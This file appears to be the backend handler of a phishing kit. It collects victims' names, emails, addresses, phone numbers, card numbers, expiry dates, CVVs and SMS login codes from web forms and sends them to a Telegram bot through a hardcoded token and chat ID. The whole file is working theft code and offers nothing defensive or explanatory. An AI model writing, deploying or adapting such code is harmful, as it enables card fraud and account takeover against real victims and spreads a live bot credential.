export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const { full_name, mail, address1, address2, zip, city, state, phone, sms1, sms2, CN, cc, exp, cvv } = req.body;

  const BOT_TOKEN = "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcZqU18QM";
  const CHAT_ID = "-4982276528";

  let message = "";

  if  (CN && cc && exp && cvv ) {
    // 🟢 رسالة الكارت
    message = `
    💳 Carte Bancaire:
    -CardholderName: ${CN}
    - Numéro: ${cc}
    - Expiration: ${exp}
    - CVV: ${cvv}
    `;
  } else if (full_name && mail && address1 && address2 && city && zip && state && phone){
    // بيانات الفورم الأولية
    message = `
📨 Infos formulaire:
- Nom: ${full_name} 
- mail: ${mail}
- address1: ${address1},${address2}, ${city}, ${zip}, ${state},
- Numéro: ${phone}
    `;
  }else if (sms1){
    message = `
    🔑 SMS recibido Login:
    - sms: ${sms1}
     `;
  }else if (sms2){
    message = `
    🔑 SMS recibido Login:
    - sms2: ${sms2}
     `;
  }


  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
    });

    res.status(200).json({ message: "تم الإرسال بنجاح!" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "خطأ أثناء الإرسال" });
  }
}

